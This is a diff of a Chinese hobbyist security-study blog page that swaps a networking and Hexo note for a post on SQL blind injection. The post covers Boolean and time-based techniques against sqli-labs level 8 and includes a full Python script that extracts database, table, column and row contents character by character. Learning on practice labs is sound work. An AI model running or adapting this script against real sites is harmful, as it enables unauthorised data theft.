@@ -3,9 +3,9 @@
 <head>
   <meta charset="utf-8">
   <meta name="referrer" content="no-referrer" />
-  <title>计算机网络基础及hexo使用 | 个人博客</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="计算机网络基础及hexo使用 | 个人博客">
+  <title>盲注 | 个人博客</title>
+  <meta name="keywords" content=" SQL注入 , 布尔注入 , 时间 , 盲注 ">
+  <meta name="description" content="盲注 | 个人博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="mysql语句以英文中的分号结尾   1.在小皮中开启数据库 2.在D:\phpstudy_pro\Extensions\MySQL5.7.26\bin目录下输出cmd，打开控制台。 3.输入mysql -u root -p 小皮数据库的默认账户密码为root和root   4.查看所有的数据库 命令 show databases;   5.创建数据库 create databaase stud">
 <meta property="og:type" content="article">
@@ -543,24 +543,45 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-03计算机网络基础及namp的使用" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-4. 盲注" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">计算机网络基础及hexo使用</h1>
+        <h1 class="article-title">盲注</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="网安学习">网安学习</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">SQL注入</a>
+            
+            <a class="color5">布尔注入</a>
+            
+            <a class="color3">时间</a>
+            
+            <a class="color3">盲注</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-07-11 09:35:58'>2024-07-11 09:35</time>
+            发布时间 : <time class="date" title='最后更新: 2024-07-23 20:45:54'>2024-07-23 20:34</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:564</span>
+        <span>字数:858</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -579,7 +600,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80"><span class="toc-text">1.计算机网络基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-namp%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-text">2.namp的使用技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">3.搭建个人博客的注意事项</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-text">1 布尔注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8%E6%97%B6%E6%9C%BA"><span class="toc-text">1.1 布尔注入使用时机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">1.2 布尔注入常用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%A1%88%E4%BE%8B"><span class="toc-text">1.3 布尔注入案例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-3-1-%E9%A6%96%E5%85%88%E5%8A%A0%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-text">1.3.1 首先加入单引号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-3-2-%E5%B0%86%E5%8D%95%E5%BC%95%E5%8F%B7%E6%B3%A8%E9%87%8A%E6%8E%89%EF%BC%8C%E5%B9%B6%E7%94%A8and-1-2-%E8%BF%9B%E4%B8%80%E6%AD%A5%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-text">1.3.2 将单引号注释掉，并用and 1&#x3D;2 进一步验证是否可以布尔注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-3-3-%E9%80%9A%E8%BF%87substr%E5%92%8Cascii%E6%9D%A5%E9%80%90%E4%B8%AA%E5%88%A4%E6%96%AD"><span class="toc-text">1.3.3 通过substr和ascii来逐个判断</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-3-4-%E5%8F%AF%E4%BB%A5%E5%80%9F%E5%8A%A9%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%B8%AE%E5%8A%A9%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">1.3.4 可以借助爆破工具，帮助猜解数据库</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E8%84%9A%E6%9C%AC"><span class="toc-text">1.4 脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">2 时间注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%E6%97%B6%E6%9C%BA"><span class="toc-text">2.1 时间注入时机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E5%87%BD%E6%95%B0"><span class="toc-text">2.2 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E5%AE%9E%E4%BE%8B"><span class="toc-text">2.3 实例</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -595,62 +616,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1-计算机网络基础"><a href="#1-计算机网络基础" class="headerlink" title="1.计算机网络基础"></a>1.计算机网络基础</h2><ol>
-<li>私网IP地址</li>
-</ol>
-<ul>
-<li>A类：10.0.0.0-10.255.255.255</li>
-<li>B类：172.16.0.0-172.31.255.255</li>
-<li>C类：192.168.0.0-192.168.255.255</li>
+        <h3 id="1-布尔注入"><a href="#1-布尔注入" class="headerlink" title="1 布尔注入"></a>1 布尔注入</h3><h4 id="1-1-布尔注入使用时机"><a href="#1-1-布尔注入使用时机" class="headerlink" title="1.1 布尔注入使用时机"></a>1.1 布尔注入使用时机</h4><ul>
+<li>页面没有回显信息和报错信息</li>
+<li>页面只有成功和失败两种页面</li>
 </ul>
-<ol start="2">
-<li>局域网、城域网、广域网是大小的不同</li>
-</ol>
-<ul>
-<li>局域网类型，比如学校</li>
+<h4 id="1-2-布尔注入常用函数"><a href="#1-2-布尔注入常用函数" class="headerlink" title="1.2 布尔注入常用函数"></a>1.2 布尔注入常用函数</h4><ul>
+<li>substr( )，截取字符串</li>
+<li>group_concat( )，将多行多列合并为一行一列</li>
+<li>ascii( )，将字符转为ascii值</li>
+<li>length()函数，length(string)函数是否返回一个字符串的长度。<br>参数string ：为需要输出其长度的字符串。<br>例：使用length函数判断“qwertyui”长度</li>
 </ul>
-<ol start="3">
-<li>特殊IP地址</li>
-</ol>
-<ul>
-<li>255.255.255.255 是广播地址。</li>
-<li>127.0.0.1&#x2F;8 是环回地址，主要是测试设备自身的软件地址。</li>
-<li>169.254.0.0&#x2F;16  没有获取IP地址时，用来临时通信</li>
+<h4 id="1-3-布尔注入案例"><a href="#1-3-布尔注入案例" class="headerlink" title="1.3 布尔注入案例"></a>1.3 布尔注入案例</h4><ul>
+<li>以sqlilabs的第8关为例</li>
 </ul>
-<ol start="4">
-<li>桥接和仅主机的区别</li>
-</ol>
-<ul>
-<li>桥接就是利用物理机的网卡，分配真实的IP地址</li>
-<li>nat就是把物理机当作路由器</li>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1721735058346-a03ec458-4e31-458b-ad83-1107d4557c78.png#averageHue=%23433430&clientId=u92e62b7e-bde4-4&from=paste&height=230&id=ue7d29020&originHeight=316&originWidth=1611&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=26308&status=done&style=none&taskId=u68dd552d-52e8-475f-aabd-1398b9b025d&title=&width=1171.6363636363637" alt="image.png"></p>
+<h5 id="1-3-1-首先加入单引号"><a href="#1-3-1-首先加入单引号" class="headerlink" title="1.3.1 首先加入单引号"></a>1.3.1 首先加入单引号</h5><ul>
+<li>页面发生改变且没有报错信息，可以确定考虑bu布尔盲注。</li>
 </ul>
-<h2 id="2-namp的使用技巧"><a href="#2-namp的使用技巧" class="headerlink" title="2.namp的使用技巧"></a>2.namp的使用技巧</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">namp -p 1=100 ip</span><br><span class="line">-p 				//扫描端口</span><br><span class="line">1-1000		//指定要扫描端口的数量</span><br><span class="line">IP        //目的主机的IP地址</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>可以收集域名信息，通过微步查询IP地址</li>
-</ol>
-<ul>
-<li>查找域名时，最主要是通过对比找打完整的IP地址</li>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1721735154492-2d955aa6-5aba-49f6-ba58-8dd35e01aafe.png#averageHue=%23493833&clientId=u92e62b7e-bde4-4&from=paste&height=215&id=u3f56385f&originHeight=296&originWidth=1825&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=28758&status=done&style=none&taskId=u612d162e-5454-4a5f-8c7a-b3902856def&title=&width=1327.2727272727273" alt="image.png"></p>
+<h5 id="1-3-2-将单引号注释掉，并用and-1-2-进一步验证是否可以布尔注入"><a href="#1-3-2-将单引号注释掉，并用and-1-2-进一步验证是否可以布尔注入" class="headerlink" title="1.3.2 将单引号注释掉，并用and 1&#x3D;2 进一步验证是否可以布尔注入"></a>1.3.2 将单引号注释掉，并用and 1&#x3D;2 进一步验证是否可以布尔注入</h5><ul>
+<li>页面错误，说可以布尔注入</li>
 </ul>
-<ol start="2">
-<li>只知道域名信息，也可通过站长之家查询IP地址</li>
-</ol>
-<h2 id="3-搭建个人博客的注意事项"><a href="#3-搭建个人博客的注意事项" class="headerlink" title="3.搭建个人博客的注意事项"></a>3.搭建个人博客的注意事项</h2><ol>
-<li>github的账户名最好不要出现 ‘_’和’-‘ ，容易出现问题</li>
-<li>当经过长时间博客没有更新，可以按顺序使用如下命令。</li>
-</ol>
-<ul>
-<li>hexo clean</li>
-<li>hexo g</li>
-<li>hexo d</li>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1721735380453-0e3fd6f0-9860-4b88-8809-ade9dde8fda4.png#averageHue=%23654c45&clientId=u92e62b7e-bde4-4&from=paste&height=159&id=u48c5eb60&originHeight=219&originWidth=1907&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=29794&status=done&style=none&taskId=u2ef75910-bfec-4e85-aa27-6573cf98459&title=&width=1386.909090909091" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1721735408096-5d009fa7-14fb-449c-af08-4440358185f3.png#averageHue=%2359433d&clientId=u92e62b7e-bde4-4&from=paste&height=183&id=ua9c11a94&originHeight=251&originWidth=1785&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=27363&status=done&style=none&taskId=ue78d0065-3bd0-4955-b836-1975297cb93&title=&width=1298.1818181818182" alt="image.png"></p>
+<h5 id="1-3-3-通过substr和ascii来逐个判断"><a href="#1-3-3-通过substr和ascii来逐个判断" class="headerlink" title="1.3.3 通过substr和ascii来逐个判断"></a>1.3.3 通过substr和ascii来逐个判断</h5><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1721735667883-b8afd618-6121-494e-9e9d-78dc492215fc.png#averageHue=%23443530&clientId=u92e62b7e-bde4-4&from=paste&height=225&id=u2e96a3bc&originHeight=310&originWidth=1835&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=36184&status=done&style=none&taskId=ub5118d25-c7f0-421f-aea7-e04389fc0d4&title=&width=1334.5454545454545" alt="image.png"></p>
+<h5 id="1-3-4-可以借助爆破工具，帮助猜解数据库"><a href="#1-3-4-可以借助爆破工具，帮助猜解数据库" class="headerlink" title="1.3.4 可以借助爆破工具，帮助猜解数据库"></a>1.3.4 可以借助爆破工具，帮助猜解数据库</h5><ul>
+<li>yakit使用双大括号，加int（），数字范围用-来连接，确定爆破范围</li>
 </ul>
-<ol start="3">
-<li><p>hexo的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面</span><br><span class="line">hexo g == hexo generate #生成</span><br><span class="line">hexo s == hexo server #启动服务预览</span><br><span class="line">hexo d == hexo deploy #部署</span><br><span class="line"></span><br><span class="line">hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</span><br><span class="line">hexo server -s #静态模式</span><br><span class="line">hexo server -p 5000 #更改端口</span><br><span class="line">hexo server -i 192.168.1.1 #自定义 IP</span><br><span class="line">hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</span><br><span class="line">hexo version  #查看Hexo的版本</span><br><span class="line">hexo generate #生成静态页面至public目录</span><br><span class="line"></span><br><span class="line">hexo s -g #生成并本地预览</span><br><span class="line">hexo d -g #生成并上传</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>hexo的目录结构</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-- .deploy      #hexo deploy生成的文件</span><br><span class="line">+-- node_modules  #npm组件</span><br><span class="line">+-- public        #生成的静态网页文件</span><br><span class="line">+--scaffolds      #模板</span><br><span class="line">+-- source        #博客正文和其他源文件</span><br><span class="line">|  +-- _posts    #我们自己写的文章以md结尾</span><br><span class="line">+-- themes        #主题</span><br><span class="line">+-- _config.yml  #全局配置文件</span><br><span class="line">-- package.json  #定义了hexo所需要的各种模</span><br></pre></td></tr></table></figure></li>
-</ol>
+<h4 id="1-4-脚本"><a href="#1-4-脚本" class="headerlink" title="1.4 脚本"></a>1.4 脚本</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"><span class="variable">session</span> <span class="operator">=</span> requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://caichuanqi.cn/lab/sqli-labs-master/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table_name=<span class="string">&quot;users&quot;</span></span><br><span class="line">#暴库</span><br><span class="line">def <span class="title function_">db</span><span class="params">()</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>,<span class="number">50</span>)</span>:</span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            paramsPost = <span class="string">&quot;and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;-- -&quot;</span> .format(i,tmp)</span><br><span class="line">            response = session.get(url+paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> in response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = <span class="type">tmp</span></span><br><span class="line">                <span class="variable">tmp</span> <span class="operator">=</span> (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print(name)</span><br><span class="line"># 暴表</span><br><span class="line">def <span class="title function_">table</span><span class="params">()</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>,<span class="number">50</span>)</span>:    </span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            paramsPost = <span class="string">&quot;and/**/ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;&#123;0&#125;&#x27;),&#123;1&#125;,1))&gt;&#123;2&#125;-- -&quot;</span> .format(database,i,tmp)</span><br><span class="line">            response = session.get(url+paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> in response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = <span class="type">tmp</span></span><br><span class="line">                <span class="variable">tmp</span> <span class="operator">=</span> (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print(name) </span><br><span class="line">def <span class="title function_">columns</span><span class="params">()</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>,<span class="number">50</span>)</span>:    </span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            paramsPost = <span class="string">&quot;and/**/ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&#123;0&#125;&#x27; and table_name=&#x27;&#123;1&#125;&#x27;),&#123;2&#125;,1))&gt;&#123;3&#125;-- -&quot;</span> .format(database,table_name,i,tmp)</span><br><span class="line">            response = session.get(url+paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> in response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = <span class="type">tmp</span></span><br><span class="line">                <span class="variable">tmp</span> <span class="operator">=</span> (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print(name)</span><br><span class="line">    print(<span class="string">&quot;爆信息&quot;</span>)</span><br><span class="line">    nr(name)</span><br><span class="line"># 获得内容</span><br><span class="line">def <span class="title function_">nr</span><span class="params">(a)</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>,<span class="number">1000</span>)</span>:    </span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            paramsPost = <span class="string">&quot;and/**/ascii(substr((select group_concat(&#123;0&#125;) from &#123;1&#125;.&#123;2&#125;),&#123;3&#125;,1))&gt;&#123;4&#125;-- -&quot;</span> .format(a,database,table_name,i,tmp)</span><br><span class="line">            response = session.get(url+paramsPost)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> in response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = <span class="type">tmp</span></span><br><span class="line">                <span class="variable">tmp</span> <span class="operator">=</span> (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print(name)       </span><br><span class="line">print(<span class="string">&quot;SQL盲注脚本&quot;</span>);</span><br><span class="line">print(<span class="string">&quot;****爆库***&quot;</span>);</span><br><span class="line">db()</span><br><span class="line">database=input(<span class="string">&quot;请输入要选择的数据库&quot;</span>);</span><br><span class="line">print(<span class="string">&quot;****爆表***&quot;</span>);</span><br><span class="line"># print(database)</span><br><span class="line"></span><br><span class="line"># database=<span class="string">&quot;security&quot;</span></span><br><span class="line"># table_name=<span class="string">&quot;users&quot;</span></span><br><span class="line">table() </span><br><span class="line">table_name=input(<span class="string">&quot;请输入要选择的表&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;****爆字段***&quot;</span>);</span><br><span class="line">columns()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ?id=<span class="number">1</span><span class="string">&#x27;and ascii(substring((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))&gt;0--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<h3 id="2-时间注入"><a href="#2-时间注入" class="headerlink" title="2 时间注入"></a>2 时间注入</h3><h4 id="2-1-时间注入时机"><a href="#2-1-时间注入时机" class="headerlink" title="2.1 时间注入时机"></a>2.1 时间注入时机</h4><ul>
+<li>也面没有任何信息可以可以利用</li>
+</ul>
+<h4 id="2-2-函数"><a href="#2-2-函数" class="headerlink" title="2.2 函数"></a>2.2 函数</h4><ul>
+<li>if(第一个参数，第二个参数，第三个参数)，第一个参数是放sql语句的地方，第二个参数是成功时所执行的语句，第三个参数是失败时执行的参数</li>
+<li>sleep( )可以让页面停留几秒</li>
+</ul>
+<h4 id="2-3-实例"><a href="#2-3-实例" class="headerlink" title="2.3 实例"></a>2.3 实例</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1721736981432-c3b2f7a0-b340-4909-a90e-a159d5e442a2.png#averageHue=%2342332f&clientId=u92e62b7e-bde4-4&from=paste&height=213&id=u9e6fc22d&originHeight=293&originWidth=1574&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=29912&status=done&style=none&taskId=u71a189ec-411b-4f1a-89c1-518de6a24b2&title=&width=1144.7272727272727" alt="image.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
